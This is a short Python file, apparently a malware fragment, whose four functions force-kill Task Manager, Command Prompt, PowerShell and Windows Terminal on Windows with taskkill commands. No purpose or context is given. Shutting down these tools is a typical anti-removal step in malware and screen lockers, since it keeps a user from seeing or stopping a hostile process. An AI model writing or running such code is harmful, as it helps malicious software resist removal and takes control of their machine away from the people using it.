import os

def killTaskManager():
    os.system("taskkill /F /IM Taskmgr.exe")

def killCommandPrompt():
    os.system("taskkill /F /IM cmd.exe")

def killPowerShell():
    os.system("taskkill /F /IM powershell.exe")

def killWindowsTerminal():
    os.system("taskkill /F /IM WindowsTerminal.exe")